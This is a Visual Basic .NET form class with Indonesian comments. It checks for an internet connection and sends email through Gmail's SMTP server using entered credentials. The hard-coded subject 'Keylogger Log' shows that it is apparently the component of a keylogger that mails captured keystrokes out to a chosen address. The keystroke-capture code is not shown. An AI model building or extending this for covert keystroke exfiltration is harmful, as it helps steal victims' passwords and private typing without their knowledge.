Imports System.Net.Mail
Imports System.Net
Imports System.Net.Sockets
Imports System.IO
Imports System.Text

Public Class EmailForm
    Public Function Koneksi() As Boolean
        Dim url As New System.Uri("https://google.com")
        Dim Request As System.Net.WebRequest
        Request = System.Net.WebRequest.Create(url)

        Dim respon As System.Net.WebResponse
        Try
            respon = Request.GetResponse
            respon.Close()
            respon = Nothing
            Return True
        Catch ex As Exception
            respon = Nothing
            Request = Nothing
            Return False
        End Try
    End Function

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            'Prosedur kirim email'
            Dim MailServer As New SmtpClient
            Dim pesan As New MailMessage()
            Dim cheat As New MailMessage()
            Dim user As String = txtSender.Text
            Dim pass As String = txtPassSender.Text
            MailServer.UseDefaultCredentials = False
            MailServer.Credentials = New Net.NetworkCredential(user, pass)
            MailServer.Port = 587
            MailServer.EnableSsl = True
            MailServer.Host = "smtp.gmail.com"

            pesan = New MailMessage()
            pesan.From = New MailAddress(txtSender.Text)
            pesan.To.Add(txtResceiver.Text)
            pesan.Subject = "Keylogger Log"
            pesan.IsBodyHtml = False
            pesan.Body = txtBody.Text
            MailServer.Send(pesan)
            MsgBox("Kirim sukses")

        Catch pesanError As Exception
            MsgBox(pesanError.ToString)
        End Try
    End Sub

    Private Sub EmailForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If Koneksi() = True Then
            lblStatus.Text = "Koneksi Aktif"
        Else
            lblStatus.Text = "Tidak ada koneksi"
        End If
    End Sub

    Private Sub lblStatus_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lblStatus.Click

    End Sub
End Class